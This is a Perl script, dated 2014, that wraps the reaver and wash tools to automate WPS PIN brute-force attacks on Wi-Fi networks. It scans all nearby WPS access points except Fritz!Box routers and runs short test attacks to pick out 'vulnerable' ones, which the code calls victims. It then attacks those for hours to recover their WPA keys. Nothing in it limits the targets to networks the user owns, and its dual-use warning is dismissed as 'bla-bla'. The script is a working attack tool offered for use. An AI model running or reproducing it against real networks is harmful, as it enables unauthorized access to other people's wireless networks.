#!/usr/bin/perl
use strict;
use IO::Handle;
autoflush STDOUT;
####################################################################################################
my $logo=<<__HELP__;
======================================================================================================================================
  modded by ..:: by crazyjunkie ::.. 2014
             Net-War Reaver Wrapper
             License: GPL (v2 only)
======================================================================================================================================
__HELP__
print $logo;

my $helptext=<<__HELP__;

bla-bla-Warning: 
"This is a Dual-Use-Tool, only use this tool for your own legal and testing purposes!"

ABOUT:
This Tool is a wrapper for the reaver WPS Attacking Toolkit
Why this tool?
reaver is great, but there is no automatic way to prescan,decide and start the attack.
This is the reason why I wrote NWRW - Net-War Reaver Wrapper.
This code is not the nicest one, i know, but hey it't working and helps!
Have fun.

GOALS:
1. scan the available networks via "wash" (This tool is part of the reaver toolkit)
2. try to attack them! do a short reaver session aggainst all the networks
   The goal is this step is to find vulnerable wps networks.
   Why? Not all WPS wlans are vulnerable. This step is a preselection. 
   The attacking itself is slow (6-20hours), so we try to find networks for which the 
   time is a good investment.
   Example: "fritzbox" -> don't try it! the developers done a good job to implement WPS

3. After we have an overview we attack all the networks!
4. wait many hours or even days
5. Enjoy the full list with results! 

REQUIREMENTS:
-BT5r3
-Currently this tools only supports the rtl8187 device "alfa awuss036h"
(this is a cheap and great USB Wlan device, if you successfully tried other devices, please let me know)

INSTALL DOKU:
aptitude install reaver


===================================================
 Options:
 "t5" as ARGV[0] = extreme fast timing  
 "t1" as ARGV[0] = extreme aggresive timing  
===================================================

__HELP__
#####################################################################################################

#rt2800usb is not working, tested with BT4+5.1+5.2
#so ... dont use this
my $chip_rtl8187="rmmod rtl8187 > /dev/null  2>&1; modprobe rtl8187 > /dev/null 2>&1; airmon-ng start wlan0 > /dev/null 2>&1";
my $chip_rt2800usb="rmmod rt2800usb > /dev/null  2>&1; modprobe rt2800usb > /dev/null 2>&1; airmon-ng start wlan0 > /dev/null 2>&1";
my $restart="$chip_rtl8187";

my $ap_rate_limit="0";
my @myp;
my @sorted_myp;;
my $possible_targets;
my $bssid="";
my $bssid_without_colon="";
my $mondev="mon0"; #depends on the output of distri and airmonng
my $washsleep="60"; #how long to sleep until we kill the wash process which shows us the vulnerable networks
my @loga;
my $restartcount="0";
my $restarttries="3";
my $attack_restarttries="300";
my $logfile="/root/reaverlog";
my $logpath="/root";
my $cmd=""; #="reaver -v -i $mondev -b $bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1";
my $washlog="/root/washlog.out";
my @washlog; #where to store the logfile for the wash session
my %hoh;
my @logfile;
my $current_bssid;
my $reaver_maxtesttime=120; #seconds
my $associated="0";
my @attackable;
my $attackable="0";
my $washline;
my $num="0";
my $hackable_targets;


foreach (@ARGV) {

  if ($_ eq "t5") {
    print "\n::::: use fast timing 't5'";
    $reaver_maxtesttime=5;
    $washsleep="5";
    print "\t washsleep= $washsleep; default is 60";
    print "\t reavermaxtime=$reaver_maxtesttime; default is 120";
  }

  if ($_ eq "t1") {
    print "\n::::: use long timing 't1'";
    $reaver_maxtesttime=600;
    $washsleep="300";
    print "\t washsleep= $washsleep; default is 60";
    print "\t reavermaxtime=$reaver_maxtesttime; default is 120";
  }

  if ($_ =~  /rt2800usb/i) {
    $restart="$chip_rt2800usb";
    print "\n::::: using driver rt2800usb";
  }

  if ($_ =~  /rtl8187/i) {
    $restart="$chip_rtl8187";
    print "\n::::: using driver rtl8187";
  }

  if ($_ =~  /-h|h|--help|--h/i) {
    print "\n$helptext";
  }




}





print "\n::::: init runs ...";
#initial reset
systemrestart();

#get the results of wash
wash_wrapper_get_results();

#now parse them
my @targets=(); #array for the target bssid's
wash_parse();

#atack each BSSID
my $targetcnt=@targets;
my $tmptime=$targetcnt * $reaver_maxtesttime;
my $tmptime=$tmptime/60;   
print "\n::::: \tTestAttack Step  will take approx $tmptime minutes ";

foreach $bssid (@targets){
  $num++;
  $current_bssid=$bssid;
  if ($bssid =~ /([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2})/i) {
    $bssid_without_colon="$1$2$3$4$5$6";
  }
  $cmd="reaver -v -i $mondev -b $bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1 ";
  flushlog_start();
  flush_reaver_progressfile();
  runtestattack();
  killall();
  parsetestattack();
  flushlog();
  print "\n\n";
}
#clean the running tools, if there any
killall();
#final output

print "\n\n::::: =================================================================================";
print "\n::::: =================================================================================";
print "\n::::: =================================================================================";
print "\n::::: TEST RUN FIN ---- RESULTS FOLLOW ----";
print_hackable();

#attack thei hackable networks
foreach $current_bssid ( @attackable ){
  attack_hackable();
}



print "\n\n\n::::: fin :::::\n\n\n";
exit 0;


######################################################## SUBS ###########################################################################
######################################################## SUBS ###########################################################################
######################################################## SUBS ###########################################################################

sub print_hackable{
  $washline="";
  print "\n\n::::: >>>>> hackable devices <<<<<";
  $hackable_targets=@attackable;  
  print "\n::::: STATS: out of $possible_targets possible targets there are $hackable_targets hackable targets";
  foreach (@attackable) {
    foreach my $hackabledev (@washlog) {
      if ($hackabledev =~ /$current_bssid/) {
        print "-----> $hackabledev";
        $washline=$hackabledev;
      }
    }
    print"\n -----> $_ n";
  }
}



sub flush_reaver_progressfile {
  system ("rm /usr/local/etc/reaver/$bssid_without_colon.wpc >/dev/null 2>&1");
}



sub parsetestattack {

  print "\n::::: >>>>>>>>>> checking results ...";
  $associated="0";
  $attackable="0";
  my $assocoated_fails="0";
  open FILE, $logfile or die "die!!!!!";
  @logfile=<FILE>;
  close FILE;

  #the most importtant! Otherwise the AP is not attackable
  foreach (@logfile) {
    if ($_ =~ /Associated with/ ) {
      $associated="1";
      print "\n::::: >>>>>>>>>> Associated with FLAG:set";
    }
    if ($_ =~ /WARNING: Failed to associate with/) {
      $assocoated_fails++;
    }
 
  }

  my $status=" NOT vulnerable ";
  if ( $associated eq "1" ){
    foreach (@logfile) {
      if ($_ =~ /([0-9]{1,2})\.([0-9]{2})\%\ complete/) {
        my $tmppercent="$1.$2";
        if ($2 > "0" || $1 > "0") {
          #This is good! we have progress!
          $attackable="1";
          push (@attackable, $current_bssid);  
          print "\n::::: >>>>>>>>>> nice, we have a victim which works";
          $status =" !!! VULNERABLE !!! ";
          last;
        }
        else {
          print "\n::::: >>>>>>>>>> found progress but it stucks at $1.$2% ";
          last;
        }
        print "\n::::: >>>>>>>>>> NO REAL progress found";
      }
    }
  }
  else {
    foreach (@logfile) {
                        if ($_ =~ /([0-9]{1,2})\.([0-9]{2})\%\ complete/) {
                                my $tmppercent="$1.$2";
                                print "\n::::: MUAHHH BUG ??? fixme process without assoucations ??? >>>>>>>>>> found progress $1.$2% ";
                                if ($2 > "0" || $1 > "0") {
                                        #This is good! we have progress!
                                        $attackable="1";
                                        push (@attackable, $current_bssid);
                                        print "\n::::: >>>>>>>>>> nice, we have a victim which works";
                                        $status ="! VULNERABLE !";
                                        last;
                                }
                                print "\n::::: >>>>>>>>>> NO REAL progress found";
                        }
      if ($_ =~ /aggregated Failed to associat messages/ ) {
        print "\n::::: >>>>>>>>>> 'aggregated Failed to associat messages found'";
      } 
                }
  }
  if ($assocoated_fails > 20 ) {
    print "\n::::: >>>>>>>>>> more than 20 $assocoated_fails found! it's $assocoated_fails times";
  }
  if ($ap_rate_limit > 0) {
    print "\n::::: >>>>>>>>>> FOUND $ap_rate_limit times WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking";
  }



  print "\n::::: =================================================================================\n";
  print "::::: >>>>>>>>>> end of results \tStatus: >>>>>$status<<<<<";
  print "\n::::: =================================================================================\n";
  
  

#FIXME 
#not good ,but no a showstopper
#with my SiteS there are 2-3 failed associatens and then it works!
#WARNING: Failed to associate with

#also not good, if it the only event
#"Waiting for beacon from"

#obsolete, I think: we don't need this, the progress is the most important part!
#  foreach (@logfile) {
#    if ($_ =~ /WARNING: 10 failed connections in a row/) {
#      print "\n::::: $bssid not working got 'WARNING: 10 failed connections in a row'   ";
#      print "\n::::: Add the beginning not a good sign!";
#
#
#    }  
#    print "\n$_";
#  }  
}



sub wash_parse {

  print "\n::::: parseing wash results";
  foreach (@washlog) {
    
    #fixme ::::: only flag it as possible fritz!box, try the attack anyway
    #fritzbox? they have a good WPS implementatios, skip them
    if ($_ =~ /FRITZ!Box/ ) {
      print "\n::::: \t\tfound a Fritz!Box, maybe not useable, skipping it";
      next;
    }

    #match for the mac address
    if ( $_ =~ /^([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})/i) {
      print "\n::::: \t\t>>>>> found a possible target BSSID: $1 ";

      push (@targets, $1);
    }  
    
  }

  $possible_targets = @targets;
  print "\n\n:::::           $possible_targets possible targets found\n\n";

}


sub debugtest {


  print "\n::::: ========== DEBUG spez001==========";
  my $gotit="0";
  foreach my $tmp (@targets) {
    print "\n::::: investigating target '$tmp'";
    if ($gotit eq "0") {
      print "  ::::: further investigating target '$tmp'";
      foreach my $tmp2(@washlog) {
        print "\n::::: looking at line $tmp2\n::::: ";
        if ($tmp2 =~ /^$tmp/i ) {
          $washline = $tmp2;
          print "\n::::: ========= OK gotit !  \$washline '$washline'";
          $gotit="1";
          last;
        }
      }
    }
  }  

}





sub wash_wrapper_get_results {
  print "\n::::: running 'wash' ... wait $washsleep sec     ";
  print "\n::::: in this step we check which WPS networks are available   ";  
  system ("wash -i mon0 -n 5 > $washlog 2>&1 &");

  my $tmpcnt="0";
  until ($tmpcnt == $washsleep) {
    sleep 1;

    if ($washsleep < 1000) {
      print ".";
    }

    $tmpcnt++;
  }

   print "\n::::: sleep is over ... kill the wash session and lets see what we have";  
  system ("killall -9 wash >/dev/null 2>&1");
  #check the results! is there a "ERROR: Failed to open" ?
  sleep 1;
  open FILE, $washlog or die "die!!!!!";
  @washlog=<FILE>;
  close FILE;
  foreach (@washlog) {
    if ($_ =~ /ERROR: Failed to open/) {
      print "\n::::: wash was not working ... trying to restart";
      system("$restart");  
      print "\n::::: running 'wash' ... wait $washsleep sec ";  
      system ("wash -i mon0 -n 5 > $washlog 2>&1 &");
      sleep $washsleep;
       print "\n::::: sleep is over ... kill the wash session and lets see what we have";  
      system ("killall -9 wash >/dev/null 2>&1");
      open FILE, $washlog or die "die!!!!!";
      @washlog=<FILE>;
      close FILE;
    }
  }
  my $tmp=@washlog;
  if ($tmp eq 0) {
    print "\t no results ..... NO Networks OR no wlan device available \n::::: FIXME FIXME check airmon results";
  }

#  foreach (@washlog) {
#    print "::::: >>>>>>>  $_";
#    
#  }    
}



sub runtestattack {
  $washline="";
  $ap_rate_limit="0";
  foreach (@washlog) {
    if ($_ =~ $current_bssid ) {
      $washline=$_;
    }
  }

  print "\n\n::::: ================================================================================================================";
  print "\n:::::  TEST ATTACK $num of $hackable_targets";
  print "\n::::: ================================================================================================================";
  print "\n::::: >>>>>>>>>> running reaper against $current_bssid";
  #print "\n$cmd";
  print "\n::::: >>>>>>>>>> $washline";
  system ("$cmd  &");
  sleep 1;
  print "::::: >>>>>>>>>> running reaver ... maxtesttime is set to $reaver_maxtesttime   ";
  
  my $testtime="0";
  my $exitloop="0";
  $restartcount="0";

  until ($exitloop eq "1") {
    if ($restartcount > $restarttries ) {
      print " <<<<< MAX restart reached ";
      $exitloop="1";
    }    
    elsif ( $testtime > $reaver_maxtesttime ) {
      print " <<<<< MAX Time reached ";
      $exitloop="1";
    }

    else {  
      sleep 5;
#      print "\n::::: checking log\t::: restarttries=$restartcount \ttesttime $testtime ";
      LOGR(); 
      
      if ($reaver_maxtesttime < 1000) {
        print ".";
      }
      $testtime=$testtime + 5;

    }
  }

#  print "\n::::: $washline";
  print "\n::::: >>>>>>>>>> TestAttack finished $current_bssid \t\t  restarttries=$restartcount \ttesttime $testtime  :::::";
}




sub attack_hackable {
  $washline="";
  $ap_rate_limit="0";
  foreach (@washlog) {
    if ($_ =~ $current_bssid ) {
      $washline=$_;
    }
  }
  print "\n::::: ==================================================================================================================";
  print "\n:::::  Attacking";
  print "\n::::: ==================================================================================================================";
  print "\n::::: >>>>>>>>>> running reaper against $current_bssid";
  print "\n::::: >>>>>>>>>> $washline";
  print "::::: >>>>>>>>>> \t !!!!! ATTACKING !!! ";
  print "\n::::: >>>>>>>>>> $cmd";
  system ("$cmd &");
  sleep 1;
  print "\n::::: OK reaper running";
  $restartcount="0";
  while ($restartcount < $attack_restarttries){
    sleep 60;
    print "\n::::: checking log\t::: restarttries=$restartcount";
    LOGR();
    @sorted_myp=sort @myp;
    print "\t >>>>> ALL FINE Status: 'up and running' @  @sorted_myp[-1] Percent";
  }
  print "\n !!!!! TOO MUCH RESTARTS !!!!!\n ";
}



sub LOGR{
  open FILE, $logfile or die "die!!!!!";
  @loga=<FILE>;
  close FILE;
  @myp=();
  foreach (@loga) {
    if ($_ =~ /Failed to recover WPA key/ ) {
      print "\n::::: restarting FAIL found: Failed to recover WPA key";
      # fixme read the log for activity before flushing
      killall();
      restart();
      last;
    }
    if ($_ =~ /WARNING: Failed to associate/ ) {
      print "\n::::: restarting FAIL found";
      # fixme read the log for activity before flushing
      killall();
      restart();
      last;
    }
    elsif ($_ =~ /Failed to initialize interface/) {
      killall();
      restart();
      last;
    }
    elsif ($_ =~ /Failed to re-initialize interface/) {
      killall();
      restart();
      last;
    }
    elsif ($_ =~ /Failed to retrieve a MAC address for interface/) {
      killall();
      restart();
      last;
    }
    elsif ($_ =~ /WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking/) {
      if ($ap_rate_limit < 10) {
        print "\n::::: fount too much 'AP rate limiting'";
        die;
      }
      $ap_rate_limit++;
      killall();
      restart();
      last;
    }
    if ($_ =~ /([0-9]{1,2}\.[0-9]{2})\%\ complete/) {
      push (@myp, "$1") ;
    }

  }
}

sub killall{
  system ("killall -9 reaver >/dev/null 2>&1");
}



sub systemrestart{
  print "\n::::: flushing old logfiles";
  system ("rm $logpath/NWRW-stats* >/dev/null 2>&1 ");
  system ("$restart");
        sleep 1;
}


sub restart{
      system ("$restart");
      sleep 1;
    #  @loga=();
      system ("$cmd &");
      $restartcount++;
      print "\t::::: restarting reaver fail found .... reaver was restarting now: 'up and running'";
      cleanlog();
      #cleanlog -> do not flush this will destroy some usefull info like some progress which we made,
      # to clean the log we could filter out or agregate some messages
  

sub cleanlog {
      open FILE, ">", $logfile or die "die!!!!!";
      my $tmpcnt="0";
      my @newloga;
      my $example;
      foreach (@loga) {
        if ($_ =~ /WARNING: Failed to associate with/) {
          $tmpcnt++;  
          $example=$_;
        }
        else {
          push (@newloga,$_);
        }
      
      }
      print FILE "\n\n\n ::::: STARTING :::::\n\n\n";
      foreach (@newloga) {
        print FILE $_;
      }
      print FILE "\naggregated Failed to associat messages, $tmpcnt times: \n$example\n";    
      close FILE;
}

  
      
}



sub flushlog_start {
      open FILE, ">", $logfile or die "die!!!!!";
      print FILE "\n\n\n ::::: STARTING :::::\n\n\n";
      close FILE;
}


sub flushlog {
      print "::::: flushing log, and writing stats ( "."$logpath"."/NWRW-stats-"."$current_bssid". ")";
      open FILE, ">", "$logpath"."/NWRW-stats-"."$current_bssid" or die "die!!!!!";
      print FILE "\n\n\n ::::: FINAL STATS for $current_bssid :::::\n\n\n";
      foreach (@loga) { print FILE $_; }
      close FILE;
      
      open FILE, ">", $logfile or die "die!!!!!";
      print FILE "\n\n\n ::::: STARTING :::::\n\n\n";
      close FILE;
      


}


